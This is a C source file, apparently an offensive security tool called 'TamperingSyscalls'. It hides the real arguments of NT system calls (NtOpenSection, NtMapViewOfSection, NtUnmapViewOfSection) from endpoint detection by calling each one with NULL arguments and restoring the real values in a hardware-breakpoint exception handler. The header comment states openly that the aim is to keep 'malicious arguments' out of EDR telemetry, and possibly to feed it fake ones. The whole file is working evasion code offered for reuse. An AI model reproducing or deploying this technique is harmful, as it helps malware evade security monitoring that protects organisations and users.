/*++
TamperingSyscalls
- @rad98
- @__mez0__ for getting the generation working, and great ideas.

How this works?
We set a HWBP on syscall address, remove the HWBP, fix the arguments, and make the call
Thus avoiding reveal our malicious arguments to the EDR telemetry.

(possibility for you to include your own fake arguments to feed EDR the wrong telemetry.
Maybe I will write a blog post on this)

Or use the script provided.
We need to setup the states (what we want to fix the arguments to) and then make the right
corresponding calls. I have provided various examples.
--*/
#include <Windows.h>
#include <winternl.h>

#pragma region macros
#define _DEBUG 1

#if _DEBUG == 0
#define PRINT( STR, ... )
#else
#define PRINT( STR, ... )                                                                   \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );			\
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  
#endif

#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
#pragma endregion

#pragma region structs
// Can't do it for NtResumeThread or NtSetEvent as these are used after the hardware breakpoint is set.
// Need to make a struct with the arguments.
typedef struct {
	HANDLE                     SectionHandle;
	HANDLE                     ProcessHandle;
	PVOID                      BaseAddress;
	ULONG                      ZeroBits;
	SIZE_T                     CommitSize;
	PLARGE_INTEGER             SectionOffset;
	PSIZE_T                    ViewSize;
	DWORD					   InheritDisposition;
	ULONG                      AllocationType;
	ULONG                      Win32Protect;
} NtMapViewOfSectionArgs;

typedef struct {
	HANDLE					   ProcessHandle;
	PVOID                      BaseAddress;
} NtUnmapViewOfSectionArgs;

typedef struct {
	PHANDLE                    SectionHandle;
	ACCESS_MASK                DesiredAccess;
	POBJECT_ATTRIBUTES         ObjectAttributes;
} NtOpenSectionArgs;


typedef struct {
	int		index;
	LPVOID	arguments;
} STATE;
#pragma endregion

#pragma region typedefs
typedef NTSTATUS( NTAPI* typeNtMapViewOfSection )(
	HANDLE                   SectionHandle,
	HANDLE                   ProcessHandle,
	PVOID                    BaseAddress,
	ULONG                    ZeroBits,
	SIZE_T                   CommitSize,
	PLARGE_INTEGER           SectionOffset,
	PSIZE_T                  ViewSize,
	DWORD			         InheritDisposition,
	ULONG                    AllocationType,
	ULONG                    Win32Protect
	);

typedef NTSTATUS( NTAPI* typeNtUnmapViewOfSection )(
	HANDLE                   ProcessHandle,
	PVOID                    BaseAddress
	);

typedef NTSTATUS( NTAPI* typeNtOpenSection )(
	PHANDLE                  SectionHandle,
	ACCESS_MASK              DesiredAccess,
	POBJECT_ATTRIBUTES       ObjectAttributes
	);
#pragma endregion

// Need to make a global variable of our struct (which we fix the arguments in the handler)
//NtGetContextThreadArgs pNtGetThreadContextArgs;
NtMapViewOfSectionArgs pNtMapViewOfSectionArgs;
NtUnmapViewOfSectionArgs pNtUnmapViewOfSectionArgs;
NtOpenSectionArgs pNtOpenSectionArgs;

// enums
enum
{
	NTMAPVIEWOFSECTION_ENUM = 0,
	NTUNMAPVIEWOFSECTION_ENUM,
	NTOPENSECTION_ENUM
};

// Need to setup states in order you call the functions.
STATE StateArray[] = {
	{ NTMAPVIEWOFSECTION_ENUM,		&pNtMapViewOfSectionArgs	},
	{ NTUNMAPVIEWOFSECTION_ENUM,	&pNtUnmapViewOfSectionArgs	},
	{ NTOPENSECTION_ENUM,			&pNtOpenSectionArgs			}
};

DWORD EnumState;

LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo );

LPVOID FindSyscallAddress( LPVOID function );

VOID SetOneshotHardwareBreakpoint( LPVOID address );

NTSTATUS SpoofSyscaller( PVOID FunctionAddress );

void RtlInitUnicodeString( PUNICODE_STRING target, PCWSTR source )
{
	if( (target->Buffer = (PWSTR)source) )
	{
		unsigned int length = wcslen( source ) * sizeof( WCHAR );
		if( length > 0xfffc )
			length = 0xfffc;

		target->Length = length;
		target->MaximumLength = target->Length + sizeof( WCHAR );
	}
	else target->Length = target->MaximumLength = 0;
}

int main()
{
	SetUnhandledExceptionFilter( OneShotHardwareBreakpointHandler );

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	LPVOID FunctionAddress = NULL;
	NTSTATUS status = 0;

	PVOID addr = NULL;
	ULONG_PTR size = NULL;
	HANDLE section = INVALID_HANDLE_VALUE;
	UNICODE_STRING uni;
	OBJECT_ATTRIBUTES oa;
	WCHAR buffer[MAX_PATH] = L"\\KnownDlls\\ntdll.dll";

	RtlInitUnicodeString( &uni, buffer );
	InitializeObjectAttributes( &oa, &uni, OBJ_CASE_INSENSITIVE, NULL, NULL );


	pNtOpenSectionArgs.ObjectAttributes = &oa;
	pNtOpenSectionArgs.SectionHandle = &section;
	pNtOpenSectionArgs.DesiredAccess = SECTION_MAP_READ | SECTION_MAP_EXECUTE;

	FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtOpenSection" );
	EnumState = NTOPENSECTION_ENUM;
	status = SpoofSyscaller( FunctionAddress );
	if( NT_SUCCESS( status ) ) {
		PRINT( "Success : 0x%x\n", status );
	}
	else {
		PRINT( "Error : 0x%x\n", status );
	}

	// Set up these 4 in the OneShotHardwareBreakpointHandler
	pNtMapViewOfSectionArgs.SectionHandle = section;
	pNtMapViewOfSectionArgs.ProcessHandle = NtCurrentProcess();
	pNtMapViewOfSectionArgs.BaseAddress = &addr;
	pNtMapViewOfSectionArgs.ZeroBits = 0;
	// Set up the remaining arguments in SpoofSyscaller.
	pNtMapViewOfSectionArgs.CommitSize = 0;
	pNtMapViewOfSectionArgs.SectionOffset = NULL;
	pNtMapViewOfSectionArgs.ViewSize = &size;
	pNtMapViewOfSectionArgs.InheritDisposition = 1;
	pNtMapViewOfSectionArgs.AllocationType = 0;
	pNtMapViewOfSectionArgs.Win32Protect = PAGE_READONLY;

	FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtMapViewOfSection" );
	EnumState = NTMAPVIEWOFSECTION_ENUM;
	status = SpoofSyscaller( FunctionAddress );
	if( NT_SUCCESS( status ) ) {
		PRINT( "Success : 0x%x\n", status );
	}
	else {
		PRINT( "Error : 0x%x\n", status );
	}

	pNtUnmapViewOfSectionArgs.ProcessHandle = NtCurrentProcess();
	pNtUnmapViewOfSectionArgs.BaseAddress = addr;
	FunctionAddress = GetProcAddress( GetModuleHandleA( "NTDLL.dll" ), "NtUnmapViewOfSection" );
	EnumState = NTUNMAPVIEWOFSECTION_ENUM;
	status = SpoofSyscaller( FunctionAddress );
	if( NT_SUCCESS( status ) ) {
		PRINT( "Success : 0x%x\n", status );
	}
	else {
		PRINT( "Error : 0x%x\n", status );
	}

	return 0;
}

NTSTATUS SpoofSyscaller( PVOID FunctionAddress )
{
	//typedef NTSTATUS( WINAPI* defaultType )();
	NTSTATUS status;
	SetOneshotHardwareBreakpoint( FindSyscallAddress( FunctionAddress ) );

	// definitions
	//defaultType fDefaultType;
	typeNtMapViewOfSection fNtMapViewOfSection;
	typeNtUnmapViewOfSection fNtUnmapViewOfSection;
	typeNtOpenSection fNtOpenSection;

	switch( EnumState ) {
	case NTMAPVIEWOFSECTION_ENUM:
		fNtMapViewOfSection = (typeNtMapViewOfSection)FunctionAddress;
		status = fNtMapViewOfSection( NULL, NULL, NULL, NULL, pNtMapViewOfSectionArgs.CommitSize, pNtMapViewOfSectionArgs.SectionOffset, pNtMapViewOfSectionArgs.ViewSize, pNtMapViewOfSectionArgs.InheritDisposition, pNtMapViewOfSectionArgs.AllocationType, pNtMapViewOfSectionArgs.Win32Protect );
		break;

	case NTUNMAPVIEWOFSECTION_ENUM:
		fNtUnmapViewOfSection = (typeNtUnmapViewOfSection)FunctionAddress;
		status = fNtUnmapViewOfSection( NULL, NULL );
		break;

	case NTOPENSECTION_ENUM:
		fNtOpenSection = (typeNtOpenSection)FunctionAddress;
		status = fNtOpenSection( NULL, NULL, NULL );
		break;
	}

	return status;
}

LONG WINAPI OneShotHardwareBreakpointHandler( PEXCEPTION_POINTERS ExceptionInfo )
{
	if( ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP )
	{
		if( ExceptionInfo->ContextRecord->Dr7 & 1 ) {
			// if the ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0 
			// then we are at the one shot breakpoint address
			// ExceptionInfo->ContextRecord->Rax should hold the syscall number
			PRINT( "Syscall : 0x%x\n", ExceptionInfo->ContextRecord->Rax );
			if( ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0 ) {
				ExceptionInfo->ContextRecord->Dr0 = 0;

				// You need to fix your arguments in the right registers and stack here.
				switch( EnumState ) {
					// RCX moved into R10!!! Kudos to @anthonyprintup for catching this 
				case NTMAPVIEWOFSECTION_ENUM:
					ExceptionInfo->ContextRecord->R10 =
						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->SectionHandle;

					ExceptionInfo->ContextRecord->Rdx =
						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ProcessHandle;

					ExceptionInfo->ContextRecord->R8 =
						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->BaseAddress;

					ExceptionInfo->ContextRecord->R9 =
						(DWORD_PTR)((NtMapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ZeroBits;

					break;

				case NTUNMAPVIEWOFSECTION_ENUM:
					ExceptionInfo->ContextRecord->R10 =
						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[EnumState].arguments))->ProcessHandle;

					ExceptionInfo->ContextRecord->Rdx =
						(DWORD_PTR)((NtUnmapViewOfSectionArgs*)(StateArray[EnumState].arguments))->BaseAddress;

					break;

				case NTOPENSECTION_ENUM:
					ExceptionInfo->ContextRecord->R10 =
						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))->SectionHandle;

					ExceptionInfo->ContextRecord->Rdx =
						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))->DesiredAccess;

					ExceptionInfo->ContextRecord->R8 =
						(DWORD_PTR)((NtOpenSectionArgs*)(StateArray[EnumState].arguments))->ObjectAttributes;

					break;

					// you have messed up by not providing the indexed state
				default:
					ExceptionInfo->ContextRecord->Rip += 1;	// just so we don't hang
					break;
				}
				return EXCEPTION_CONTINUE_EXECUTION;
			}
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

typedef struct {
	HANDLE		hThread;
	HANDLE		hSynvnt;
	LPVOID		address;
} ONE_SHOT;

DWORD WINAPI RegisterDebug( LPVOID lpParameter )
{
	ONE_SHOT* OneShot = (ONE_SHOT*)lpParameter;

	if( !SuspendThread( OneShot->hThread ) ) {

		CONTEXT context = { 0 };
		context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
		if( GetThreadContext( OneShot->hThread, &context ) )
		{

			context.Dr0 = (DWORD64)OneShot->address;
			context.Dr6 = 0;
			context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 16)) | (0 << 16);
			context.Dr7 = (context.Dr7 & ~(((1 << 2) - 1) << 18)) | (0 << 18);
			context.Dr7 = (context.Dr7 & ~(((1 << 1) - 1) << 0)) | (1 << 0);

			context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
			SetThreadContext( OneShot->hThread, &context );
		}
		ResumeThread( OneShot->hThread );
	}

	SetEvent( OneShot->hSynvnt );

	return 0;
}

VOID SetOneshotHardwareBreakpoint( LPVOID address )
{
	ONE_SHOT* OneShot =
		(ONE_SHOT*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( ONE_SHOT ) );

	OneShot->address = address;
	OneShot->hSynvnt = CreateEvent( 0, 0, 0, 0 );
	OneShot->hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId() );

	HANDLE hThread = CreateThread( 0, 0, RegisterDebug, (LPVOID)OneShot, 0, 0 );

	WaitForSingleObject( OneShot->hSynvnt, INFINITE );

	CloseHandle( OneShot->hSynvnt );
	CloseHandle( OneShot->hThread );
	CloseHandle( hThread );

	HeapFree( GetProcessHeap(), 0, OneShot );

	return;
}

/// + 0x12 generally 
LPVOID FindSyscallAddress( LPVOID function )
{
	BYTE stub[] = { 0x0F, 0x05 };
	for( unsigned int i = 0; i < (unsigned int)25; i++ )
	{
		if( memcmp( (LPVOID)((DWORD_PTR)function + i), stub, 2 ) == 0 ) {
			return (LPVOID)((DWORD_PTR)function + i);
		}
	}
	return NULL;
}